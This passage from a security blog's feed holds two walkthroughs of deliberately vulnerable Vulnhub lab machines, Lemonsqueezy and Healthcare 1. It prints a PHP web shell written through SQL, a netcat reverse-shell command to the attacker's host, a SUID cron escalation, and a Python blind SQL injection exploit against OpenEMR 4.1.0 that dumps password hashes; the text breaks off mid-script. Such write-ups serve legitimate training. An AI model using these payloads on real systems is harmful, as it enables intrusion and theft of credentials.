&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
script.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00014s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:FF:26:DE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;VMware&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p&gt;
&lt;p&gt;After performing a directory bruteforce using ffuf we get the following directories:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After logging into wordpress with the discovered credentials &lt;strong&gt;orange:ginger&lt;/strong&gt;, we find another password in drafts.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this password, we are able to login to phpmyadmin as the orange user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Successful login:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;into&lt;/span&gt; outfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can then verify that we have successful command execution, by running the whoami command.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
&lt;p&gt;Running the below curl command we are able to get a reverse shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After performing some manual local enumeration, we discover a cron job running as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /suidbash
chmod u+s /suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./suidbash -p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;It seems I forgot user.txt and it is in /var/www.&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Healthcare 1</title>
      <link>https://blog.ikuamike.io/posts/2021/healthcare1/</link>
      <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/healthcare1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;29 Jul 2020&lt;/td&gt;
&lt;td&gt;v1n1v131r4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial
entry. To escalate our privileges we abuse a suid binary that doesn&amp;rsquo;t use absolute path in commands it&amp;rsquo;s running,
therefore we can hijack any of those commands and run any commands of our choosing as root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.106
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; disallowed entries
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Coming Soon &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
Service Info: OS: Unix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;21-ftp&#34;&gt;21 (FTP)&lt;/h2&gt;
&lt;p&gt;Anonymous access is not enabled and the server version isn&amp;rsquo;t vulnerable to any known vulnerabilities.
We can look at this again when we have credentials.&lt;/p&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Accessing this on the browser, we only get a static site with not much functionality.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we perform a directory bruteforce we get the following results:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ffuf -ic -c -u &#39;http://192.168.56.106/FUZZ&#39; -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After checking the directories we have discovered, openemr returns an application. From their website:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenEMR is the most popular open source electronic health records and medical practice management solution.&lt;/p&gt;
&lt;/blockquote&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
we discover an sql injection vulnerability.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Unfortunately the PoC provided doesn&amp;rsquo;t work. I found a better one from packetstormsecurity:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&#39;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
submitted to exploit-db.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: OpenEMR 4.1.0 - SQL Injection&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 2021-04-03&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Michael Ikua&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage: https://www.open-emr.org/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 4.1.0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   ____                   ________  _______     __ __   ___ ____
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &amp;lt;  // __ &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    /_/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ____  ___           __   _____ ____    __    _
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;)

all &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable
&lt;span style=&#34;color:#75715e&#34;&gt;# edit url to point to your openemr instance&lt;/span&gt;
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users_num&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Finding number of users...&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if((select count(username) from users)=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
            user_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Found number of users: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(user_length))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; user_length

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users&lt;/span&gt;():
    users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extract_users_num()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Extracting username and password hash...&amp;#34;&lt;/span&gt;)
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(length((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1))=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
        &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
            length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,length&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; all:
            payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(ascii(substr((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1),&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(i)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,1))=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(ord(char))&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
            &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
                output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(char)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(char, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, flush&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)


&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    extract_users()
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
